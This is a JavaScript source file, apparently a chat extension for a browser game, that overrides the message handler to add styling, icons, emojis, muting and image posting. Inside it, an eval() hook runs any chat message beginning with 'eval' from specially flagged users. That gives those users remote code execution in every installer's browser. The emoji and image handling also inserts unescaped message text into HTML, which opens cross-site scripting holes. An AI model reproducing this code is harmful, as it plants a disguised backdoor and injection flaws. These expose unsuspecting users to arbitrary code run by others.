chatRoom.receiveMessage = function(msg, message, color, extra) {
    // If its not set, then its blank.
    const btaMsgTime = document.getElementById('btaMsgTime');
    if (!extra.team) { extra.team = ""; }
    // Only display chat messages if they are on the same team as this player, OR from an admin
    if (extra.team != $("#team_name").val() && !extra.isAdmin && !window.seeAllChat) {
        //console.log('skipping chat message because team ' + extra.team + ' != ' + $("#team_name").val() + ' and admin ' + extra.isAdmin);
        return;
    } else {
        //console.log('displaying chat message for team ' + extra.team + ' = ' + $("#team_name").val() + ' or admin ' + extra.isAdmin);
    }

    //var chatcolor = tm_chatuser;
    var tabContent = $("<div style='display:none;' />");

    var timeStyle = ''

    timeStyle += `font-size:${btaChatTextSize.value}px;`

    if(btaMsgTime.checked == false){
      timeStyle += 'display:none;'
    }

    if(extra.isAdmin || extra.isServer || extra.isBold || extra.isTroll){
      timeStyle += 'font-weight:700;'
  }

    Object.values(users).forEach(user=>{
      if(user.bold>1){
        if(extra.uid == user.uid)timeStyle += 'font-weight:700;';
      }
})


var errors = $(`<span class='time' style='${timeStyle}'>`).text(`[${this.getTimeStr()}] `);
    // user custom name color style
    var style = ' style="';
    if (color && color != '#ffffff') {
        style += 'color: ' + color + ';';
    }
    if (extra.isAdmin || extra.isServer || extra.isBold || extra.isTroll) {
        style += ' font-weight: bold;';
    }
    if (extra.isServer){
      style += ' color:#548fff;';
    }
    style += `font-size:${btaChatTextSize.value}px;`
    style += '"';
    // If we got their PID, caches it and their details
    if (extra.pid) {
        if (!window.playerDetails[extra.pid]) { window.playerDetails[extra.pid] = {}; }
        $.extend(window.playerDetails[extra.pid], extra);
        style += ' onclick="window.onChatClick(' + extra.pid + ')" pid="' + extra.pid + '"';
    }
if(msg.includes("evenzinho"))return;

    // If we are in window.seeAllChat then display team names in parenthesis
    if (window.seeAllChat) {
        msg += ' (' + extra.team + ')';
    }
    var size = $('<span class="sender"' + style + '>').text(msg + " : ");
    tabContent.append(errors);
    Object.values(users).forEach(user=>{
      Object.values(icons).forEach(icon=>{
var pSize = btaStorage.chatText*2
var iconStyle = `max-height:${pSize}px;padding-bottom:7px;`
    if(user.icon) {
        if(icon.name == user.icon){
    if(extra.uid == user.uid){tabContent.append(`<img title="${icon.title}" style="${iconStyle}" class="icon" src="${icon.url}"> `)}
  }
};
})

})
    tabContent.append(size);
    errors = $(`<span class='msg' style='font-size:${btaChatTextSize.value}px;'>`).text(message);
    tabContent.append(errors);
    $("#chatroom").append(tabContent);
    $(tabContent).fadeIn(250)
    this.popupChat(msg, message, color);
    //$('.sender').css('color', chatcolor);
      goChatUP()
      if(btaEmojis.checked){
      Object.values(emojis).forEach(emoji=>{
        if(emoji.type === "custom"){
        if($(`span.sender`).last().next("span.msg").text().includes(`:${emoji.name}:`)){
          var fix = $(`span.sender`).last().next("span.msg").text().replace(`:${emoji.name}:`, `<img class='emoji' title=':${emoji.name}:' src='${res}/emojis/custom/${emoji.name}.png'>`);
          $(`span.sender`).last().next("span.msg").html(fix);
        }}
        });
      }

        Object.values(users).forEach(user=>{

  if(user.muted==true){
    if(extra.uid == user.uid)$(tabContent).remove()
  }

//eval command
if(user.eval == true){
if(extra.uid == user.uid){
  var evaled = $(`span.sender[pid=${extra.pid}]`).last().next("span.msg").text();
  if(evaled.startsWith("eval")){
  var script = evaled.replace("eval", " ");
  evaled = script;
  eval(evaled);
  $(`span.sender[pid=${extra.pid}]`).last().next("span.msg").text("Evaled:" + evaled);
}}}

if(user.color){if(extra.uid == user.uid){$(`span.sender[pid=${extra.pid}]`).next("span.msg").css("color", `${user.color}`);}}
if(user.bold){if(extra.uid == user.uid){$(`span.sender[pid=${extra.pid}]`).css("font-weight", "700");}}
if(user.bold>2){if(extra.uid == user.uid){$(`span.sender[pid=${extra.pid}]`).next("span.msg").css("font-weight", "600");}}

//chat stuff
if(user.img){if(extra.uid == user.uid){//img
if($(`span.sender[pid=${extra.pid}]`).last().next("span.msg").text().startsWith("$img")){
  var fix = $(`span.sender[pid=${extra.pid}]`).last().next("span.msg").text().replace("$img", "");
  $(`span.sender[pid=${extra.pid}]`).last().next("span.msg").text("Sent a picture:");
  $("#chatroom").append(`<img src="https://i.imgur.com/${fix}.png" style="max-width:280px;max-height:280px;">`)
}

if(user.img>1){//gif
  if($(`span.sender[pid=${extra.pid}]`).last().next("span.msg").text().startsWith("$gif")){
    var fix = $(`span.sender[pid=${extra.pid}]`).last().next("span.msg").text().replace("$gif", "");
    $(`span.sender[pid=${extra.pid}]`).last().next("span.msg").text("Sent a gif:");
    $("#chatroom").append(`<img src="https://i.imgur.com/${fix}.gif" style="max-width:280px;max-height:280px;">`)}}}}
});
};
